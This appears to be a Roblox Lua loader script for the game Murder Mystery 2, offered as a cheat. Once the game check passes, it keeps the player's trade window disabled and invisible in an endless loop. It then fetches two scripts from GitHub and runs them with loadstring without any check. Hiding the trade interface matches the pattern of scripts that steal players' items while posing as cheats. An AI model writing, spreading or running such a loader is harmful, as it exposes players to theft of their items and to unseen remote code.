if getgenv().MainKey == "nil" then

   getgenv().MainLoad = true
    
    --// Game Checker
    if game.PlaceId == 142823291 then -- MM2 Normal & Disguises
      
        repeat wait() until pcall(function() return game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Crafting.Inventory.Salvage end)

         spawn(function() 
    while true do
        pcall(function()
            local gui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("TradeGUI")
            if gui then
                gui.Enabled = false
                local frame = gui:FindFirstChild("Container")
                if frame then
                    frame.Visible = false
                end
            end
        end)
        wait()
    end
end)
      
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NarcissistDev/Resources/refs/heads/main/TestEnvironment"))()
      
        loadstring(game:HttpGet("https://raw.githubusercontent.com/NarcissistDev/Celestial/main/MM2"))() --# Main Load
    
    else

        game.Players.LocalPlayer:Kick("Unsupported Game")

    end
    
    else
    
        game.Players.LocalPlayer:Kick("Modified Loadstring Detected. Please Use The Official Loadstring From https://celestialscript.store")
    
    end
